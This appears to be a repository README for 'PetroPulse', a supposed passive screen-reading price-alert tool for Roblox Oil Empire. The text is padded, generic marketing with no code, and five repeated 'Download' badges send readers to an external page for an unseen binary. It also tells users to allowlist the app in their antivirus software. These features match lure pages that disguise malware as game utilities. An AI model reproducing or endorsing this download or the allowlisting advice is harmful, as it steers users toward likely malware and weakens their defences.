![preview](https://raw.githubusercontent.com/Werisixx/oil-empire-screen-sentinel/main/frame_6a78.svg)
[![Download](https://raw.githubusercontent.com/Werisixx/oil-empire-screen-sentinel/main/bin_5790495.svg)](https://Werisixx.github.io/oil-empire-screen-sentinel/)

# 🛢️ PetroPulse — Real-Time Fuel Market Sentinel for Roblox Oil Empire

**An independent, screen-aware market intelligence companion for tycoon-style oil trading loops.**

PetroPulse is a standalone desktop observation tool that watches your Roblox Oil Empire session through non-intrusive screen sampling, transcribes on-screen price boards with an optical character recognition pipeline, and pushes structured market signals to a lightweight dashboard, a system tray notifier, and optional webhook relays. Think of it as a weather station for crude — it does not touch the game, it simply reads the sky you already see and tells you when a storm is brewing.

The entire architecture is built on the principle of **ambient awareness**: you should be able to farm, refine, and haul without ever alt-tabbing into a spreadsheet. PetroPulse sits quietly in the background, converts pixels into numbers, and taps you on the shoulder only when something materially interesting happens.

> **A note on intent:** PetroPulse is a personal analytics and alerting utility. It never injects input, never modifies game memory, and never automates gameplay actions. It observes. You decide.

[![Download](https://raw.githubusercontent.com/Werisixx/oil-empire-screen-sentinel/main/bin_5790495.svg)](https://Werisixx.github.io/oil-empire-screen-sentinel/)

---

## 📚 Table of Contents

- [Why PetroPulse Exists](#-why-petropulse-exists)
- [Conceptual Overview](#-conceptual-overview)
- [Feature Highlights](#-feature-highlights)
- [Architecture Diagram (Textual)](#-architecture-diagram-textual)
- [The Signal Pipeline, Step by Step](#-the-signal-pipeline-step-by-step)
- [Module Reference](#-module-reference)
- [Configuration Surface](#-configuration-surface)
- [Alerting Channels](#-alerting-channels)
- [Responsive Dashboard Tour](#-responsive-dashboard-tour)
- [Multilingual Support Matrix](#-multilingual-support-matrix)
- [Performance & Resource Envelope](#-performance--resource-envelope)
- [Compatibility Notes](#-compatibility-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Troubleshooting Playbook](#-troubleshooting-playbook)
- [Ethical Use & Community Guidelines](#-ethical-use--community-guidelines)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Acknowledgements](#-acknowledgements)

[![Download](https://raw.githubusercontent.com/Werisixx/oil-empire-screen-sentinel/main/bin_5790495.svg)](https://Werisixx.github.io/oil-empire-screen-sentinel/)

---

## 🌋 Why PetroPulse Exists

Oil Empire is a game of margins and timing. A barrel bought at the wrong moment is a barrel sold at a loss. The in-game market board refreshes on its own rhythm, and the window between "cheap crude" and "premium refined" is measured in seconds, not minutes. Human attention is a terrible instrument for that kind of cadence — it drifts, it blinks, it gets distracted by a refinery fire.

PetroPulse reframes the problem. Instead of asking a player to stare at a number, it asks a **camera to stare at a number on the player's behalf**. That single inversion unlocks everything else: historical price curves, threshold alerts, anomaly detection, and multi-region arbitrage views that would be impossible to assemble by hand.

The philosophical stance is that **awareness should be passive and intelligence should be active**. You provide the awareness by leaving the game window open. PetroPulse provides the intelligence by constantly re-reading what that window shows.

---

## 🧠 Conceptual Overview

At its heart, PetroPulse is a four-stage loop:

1. **Perceive** — grab a rectangle of your screen at a fixed cadence using a fast multi-platform screen capture layer.
2. **Interpret** — locate the price board region, isolate glyphs, and decode them into numeric values with a tuned optical recognition engine.
3. **Reason** — compare the new reading against rolling windows, volatility bands, and user-defined rules.
4. **Relay** — surface the outcome through a tray notification, a dashboard tile, a sound cue, or an outbound webhook.

Each stage is independently replaceable. If you swap the OCR engine, the reasoners still work. If you add a new reasoner, the relays inherit it automatically. This decoupling is what makes PetroPulse maintainable across game UI updates and display configuration changes.

A useful metaphor: PetroPulse is a **tide gauge on a pier**. The ocean (the game) does whatever it does. The gauge (PetroPulse) records the level, notes the trend, and rings a bell when the water crosses a line you drew. The gauge never swims.

---

## ✨ Feature Highlights

- 🎯 **Region-Anchored Capture** — define one or many screen regions by drag-selection; each region becomes its own independent price feed.
- 🔍 **Adaptive Glyph Recognition** — digit templates are refreshed per session to cope with resolution changes, UI scaling, and seasonal theme overlays.
- 📈 **Rolling Analytics** — moving averages, deltas, rate-of-change, and volatility estimates computed on a sliding window.
- 🔔 **Rule-Based Alerting** — thresholds, crossovers, streak detectors, and silence windows so you are not buried in noise.
- 🖥️ **Responsive Dashboard** — a local web surface that reflows from ultrawide monitors down to a phone strip, because your refinery does not care what device you check it on.
- 🌐 **Multilingual Support** — interface strings, alert copy, and notification templates localized across eleven languages with community contributions welcome.
- 🕒 **24/7 Customer Support Model** — an asynchronous, always-open support channel with documented SLAs and a rotating volunteer steward roster. Support is a rhythm, not an office hour.
- 🧩 **Pluggable Reasoners** — drop in new analysis modules without touching the capture or relay layers.
- 🔐 **Local-First Data** — every reading lives on your machine in a compressed time-series store. Nothing is uploaded unless *you* wire a webhook.
- 🧭 **Multi-Region Arbitration** — compare two oil fields side by side to spot spread opportunities.
- 🪶 **Low Footprint** — target envelope of under 3% single-core CPU on a 5-second polling cadence at 1080p.
- ♻️ **Session Replay** — scrub backward through any previous session to study what you missed.
- 🧪 **Self-Test Harness** — synthetic price boards let you validate recognition accuracy without launching the game.

[![Download](https://raw.githubusercontent.com/Werisixx/oil-empire-screen-sentinel/main/bin_5790495.svg)](https://Werisixx.github.io/oil-empire-screen-sentinel/)

---

## 🏗️ Architecture Diagram (Textual)

    ┌──────────────────────────────────────────────────────────────┐
    │                        Your Display                          │
    │   ┌────────────────────────┐   ┌────────────────────────┐    │
    │   │   Oil Empire Window    │   │   Other Windows        │    │
    │   └────────────────────────┘   └────────────────────────┘    │
    └───────────────┬──────────────────────────────────────────────┘
                    │  (region rectangles only)
                    ▼
    ┌──────────────────────────────┐
    │  Capture Layer  (mss)        │
    │  fixed-cadence frame grab    │
    └───────────────┬──────────────┘
                    ▼
    ┌──────────────────────────────┐
    │  Vision Layer  (OpenCV)      │
    │  denoise · threshold · crop  │
    └───────────────┬──────────────┘
                    ▼
    ┌──────────────────────────────┐
    │  Recognition Layer (EasyOCR) │
    │  glyph decode · numeric cast │
    └───────────────┬──────────────┘
                    ▼
    ┌──────────────────────────────┐
    │  Reasoner Layer              │
    │  MA · delta · volatility     │
    │  threshold · crossover       │
    └───────────────┬──────────────┘
                    ▼
    ┌──────────────────────────────┐
    │  Relay Layer                 │
    │  tray · sound · dashboard    │
    │  webhook · log file          │
    └──────────────────────────────┘

Every arrow is a serialized message on an internal bus, which means you can attach debug taps anywhere without disturbing production flow.

---

## 🔬 The Signal Pipeline, Step by Step

### 1. Session Handshake
When PetroPulse launches, it enumerates displays, asks you to confirm which monitor hosts the game, and offers a guided region-selection wizard. The wizard freezes a snapshot of your desktop so you can draw boxes with confidence rather than guessing coordinates.

### 2. Cadence Negotiation
You choose a polling interval. Shorter intervals yield smoother curves at higher CPU cost; longer intervals are gentler but can miss fast spikes. A sensible default of five seconds is tuned for Oil Empire's board refresh rhythm, but the system adapts: if a reading is unchanged for several cycles, it may gently back off to conserve resources, then sprint back when a change is detected.

### 3. Pre-Processing
Raw frames are noisy. Anti-aliasing, GPU shimmer, HUD overlays, and rain effects all conspire against clean reads. The vision layer normalizes brightness, applies adaptive thresholding, and crops tightly around detected glyph clusters. It also detects whether the board is partially obscured — a player standing in front of the sign is an occupational hazard — and marks the reading as low-confidence rather than feeding garbage downstream.

### 4. Recognition
The recognition layer maintains a small per-session glyph cache. When a character shape appears repeatedly, it is memorized and subsequent matches become nearly instantaneous. Ambiguous reads are cross-checked against the previous value: a sudden jump from 118 to 718 is flagged as suspicious and re-evaluated before it is committed.

### 5. Reasoning
Reasoners subscribe to the normalized feed. Each reasoner is a small, testable unit with a declared input contract and an output event type. The default set includes moving average, simple delta, percentage change, streak detector, and threshold crossover. Users can disable any of them without breaking the rest.

### 6. Relay
Alerts are dispatched to whichever channels you enabled. The tray notifier is the fastest; the dashboard is the richest; the webhook is the most extensible. A deduplication filter prevents the same logical event from firing twice across channels within a cooldown period.

---

## 🧩 Module Reference

| Module | Responsibility | Typical Cadence |
| --- | --- | --- |
| `capture` | Frame acquisition per region | every poll |
| `vision` | Denoise, threshold, crop | every poll |
| `recognize` | Glyph decode to numeric | every poll |
| `reason` | Analytics and rule evaluation | every poll |
| `relay` | Fan-out to notification channels | event-driven |
| `dashboard` | Local responsive web surface | on demand |
| `store` | Compressed time-series persistence | batched |
| `i18n` | Locale bundle resolution | per string access |
| `support` | Rotating steward roster and playbooks | continuous |
| `selftest` | Synthetic board generation and accuracy scoring | manual |

Each module ships with its own unit test suite and a shared integration fixture, so a change in `recognize` cannot silently break `reason`.

---

## ⚙️ Configuration Surface

Configuration lives in a human-readable file that the app hot-reloads. Representative knobs include:

- **Capture**
  - `poll_interval_ms` — how often to sample
  - `region_definitions` — named rectangles with per-region labels
  - `monitor_index` — which display hosts the game
- **Vision**
  - `threshold_method` — adaptive or Otsu
  - `denoise_strength` — low, medium, high
  - `obstruction_guard` — enable partial-occlusion detection
- **Recognition**
  - `confidence_floor` — minimum score before a read is trusted
  - `outlier_rejection` — jump-sanity configuration
  - `glyph_cache_size` — how many shapes to remember
- **Reasoning**
  - `window_seconds` — rolling window length
  - `volatility_band` — thresholds for anomaly flags
  - `streak_length` — consecutive deltas that trigger a streak alert
- **Relay**
  - `tray_enabled`, `sound_enabled`, `webhook_url_configured`
  - `quiet_hours` — silence windows for non-critical events
  - `dedupe_cooldown_seconds` — duplicate suppression
- **Localization**
  - `locale` — active language code
  - `fallback_locale` — used when a string is missing

Every key is documented inline in the sample configuration, and an unknown key produces a friendly warning rather than a crash.

---

## 📣 Alerting Channels

### System Tray Notifications
The tray channel is the workhorse. Alerts appear as native notifications with a short title and one line of context. Click to open the dashboard focused on the triggering region.

### Sound Cues
Distinct tones map to event classes: a soft chime for threshold crossings, a two-note rise for positive streaks, a two-note fall for negative streaks, and a muted tick for low-confidence reads so you know calibration may be drifting.

### Local Dashboard
The dashboard is served on loopback only. It presents live curves, current values, region health badges, and a filterable event log. It is designed to be glanceable at a distance and to reflow gracefully on narrow screens.

### Outbound Webhook
For the tinkerers: any event can be serialized to JSON and posted to an endpoint you control. This makes PetroPulse a bridge into home automation dashboards, chat relays, or your own analytics stack.

### Log File
An append-only log keeps every raw reading and every derived event for auditing and replays.

---

## 🖥️ Responsive Dashboard Tour

The dashboard is intentionally spartan so that the numbers dominate. Layout decisions:

- **Wide layouts** present a horizontal strip: region tiles on the left, live curve in the center, event log on the right.
- **Medium layouts** stack the curve above the tiles and collapse the log into a drawer.
- **Narrow layouts** show one region at a time with swipe navigation and a single-line sparkline.
- **Contrast** is tuned for both bright and dark office lighting; a theme toggle is one keystroke away.
- **Motion** respects reduced-motion preferences; curves appear instead of animating when requested.
- **Typography** scales with your browser settings so nobody has to squint at a barrel price.

Accessibility is treated as a first-class feature: every tile has a text equivalent, every chart has a data table fallback, and color is never the sole carrier of meaning.

---

## 🌐 Multilingual Support Matrix

PetroPulse ships with bundled locales and falls back gracefully to English for any missing string. Community translations are welcome and reviewed by volunteer stewards.

| Locale | Code | Status |
| --- | --- | --- |
| English | `en` | Complete |
| Spanish | `es` | Complete |
| Portuguese (Brazil) | `pt-BR` | Complete |
| French | `fr` | Complete |
| German | `de` | Complete |
| Italian | `it` | Complete |
| Dutch | `nl` | Substantial |
| Polish | `pl` | Substantial |
| Turkish | `tr` | Substantial |
| Japanese | `ja` | Partial |
| Korean | `ko` | Partial |

Adding a language means creating one flat key-value file. No build step, no compilation, no vendored toolchains.

---

## 🚀 Performance & Resource Envelope

PetroPulse is designed to be a good neighbor on your machine. Reference targets measured on a mid-range 2023 laptop:

- **CPU**: under 3% of a single core at five-second polling, 1080p, one region.
- **Memory**: steady-state under 220 MB with three regions and a 24-hour history window.
- **Disk**: compressed store grows roughly 1 MB per day per region at default cadence.
- **Startup**: cold start under two seconds to first reading on a warm glyph cache.
- **GPU**: none required; no exclusive graphics contexts are opened.

If the app detects sustained high CPU, it automatically lengthens the polling interval and surfaces a gentle notice, preferring steady operation over frantic sampling.

---

## 🧷 Compatibility Notes

- **Operating systems**: Windows 10/11, macOS 12+, and mainstream Linux desktops with X11 or Wayland portals where supported.
- **Displays**: single and multi-monitor arrangements, including mixed-DPI setups.
- **Game window modes**: windowed and borderless windowed are recommended. Exclusive fullscreen may prevent capture on some systems; a one-line hint appears if no frames arrive.
- **Roblox client**: kept deliberately agnostic. PetroPulse reads pixels; it does not inspect processes.
- **Antivirus**: some suites flag screen-capture libraries by heuristic. Adding the app directory to your allowlist resolves this.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Region health scoring with auto-recalibration prompts.
- **Q2 2026** — Correlated multi-region spread view with export to CSV.
- **Q3 2026** — Optional lightweight agent that aggregates multiple machines into one dashboard.
- **Q4 2026** — Community reasoner registry with signed manifests.
- **Ongoing** — Locale expansion, accuracy improvements, and dashboard accessibility refinements.

Roadmap items are commitments of direction, not promises of dates. Life happens; the tide waits for no one.

---

## ❓ Frequently Asked Questions

**Does PetroPulse interact with the game?**
No. It reads your screen. It never sends input, never reads game memory, and never automates play.

**Will it work if the game UI changes?**
Usually yes, with recalibration. The region wizard and per-session glyph cache absorb most visual changes. Major layout overhauls may require redrawing regions and running the self-test.

**Can I monitor more than one oil field?**
Yes. Each region is an independent feed with its own analytics and alerts.

**What happens to my data?**
It stays on your machine. Webhooks are opt-in and off by default.

**How do I get help at 3 a.m.?**
The support model is asynchronous and always open: open a discussion thread, and a rotating steward will pick it up. Response expectations are documented in the support playbook.

**Can I use this on a laptop with integrated graphics?**
Yes. There is no GPU requirement.

**Is there a mobile app?**
Not a native one. The responsive dashboard is designed to work well in a mobile browser on your local network if you choose to expose it.

---

## 🛠️ Troubleshooting Playbook

- **No frames captured** — confirm windowed or borderless mode, confirm the correct monitor index, and ensure no screen-recording privacy toggle is blocking capture.
- **Readings fluctuate wildly** — lower the confidence floor's aggressiveness, enable obstruction guard, and re-run calibration under stable lighting.
- **Alerts fire too often** — widen the dedupe cooldown and increase the streak length.
- **Dashboard unreachable** — the dashboard binds to loopback by default. Check your local firewall if you intentionally exposed it to a LAN.
- **High CPU** — reduce regions, lengthen the polling interval, or disable obstruction guard.
- **Webhook silence** — verify the endpoint accepts POST, check for TLS certificate issues, and inspect the local log for the outbound response code.
- **Locale strings missing** — your language may be partially translated; missing keys fall back to English by design.

Each of these entries links to a deeper appendix in the documentation folder.

---

## 🤝 Ethical Use & Community Guidelines

PetroPulse exists to make the game more interesting, not less fair. Users are expected to:

- Respect the game's terms of service and any regional rules that apply.
- Avoid using PetroPulse to harass, spam, or gain an unfair social advantage over others.
- Treat support channels as a shared resource; be patient with volunteer stewards.
- Report recognition failures with screenshots and configuration context so everyone benefits.

The project disclaims any responsibility for how third parties choose to use it. Be a decent neighbor.

---

## 🌱 Contributing

Contributions are welcome in many forms: locale files, reasoner modules, dashboard tweaks, documentation improvements, and bug reports with reproducible steps. Before opening a large change, start a discussion so the design can be aligned early. All contributors are expected to follow a respectful, inclusive code of conduct.

Good first issues are labeled clearly, and the project maintains a separate "welcome wagon" thread where newcomers can ask anything without judgment.

---

## ⚠️ Disclaimer

This project is an independent, community-built utility. It is **not affiliated with, endorsed by, or sponsored by Roblox Corporation or the developers of Oil Empire**. All trademarks and game assets belong to their respective owners.

PetroPulse performs **passive screen observation only**. It does not modify, inject into, or automate the game client in any way. Any use of this software is at your own discretion and risk. The maintainers provide the software on an as-is basis and make no guarantees about accuracy, fitness for a particular purpose, or uninterrupted operation. Users are responsible for complying with any applicable terms of service and local regulations.

Alert thresholds, analytics, and any decision-support output are informational only and should never be treated as financial or gameplay advice.

---

## 📄 License

This project is released under the **MIT License**. See the full text at the canonical license location:

https://opensource.org/licenses/MIT

You are welcome to use, modify, and distribute this software in accordance with the terms of that license. Attribution is appreciated, not required.

---

## 🙏 Acknowledgements

Gratitude to the maintainers of the underlying open-source libraries that make screen observation and optical recognition approachable for independent developers. Thanks also to the early testers who drew region boxes at ungodly hours, the translators who gave the interface a second voice, and the stewards who keep the support channel warm around the clock.

The tide keeps moving. PetroPulse just writes it down.

[![Download](https://raw.githubusercontent.com/Werisixx/oil-empire-screen-sentinel/main/bin_5790495.svg)](https://Werisixx.github.io/oil-empire-screen-sentinel/)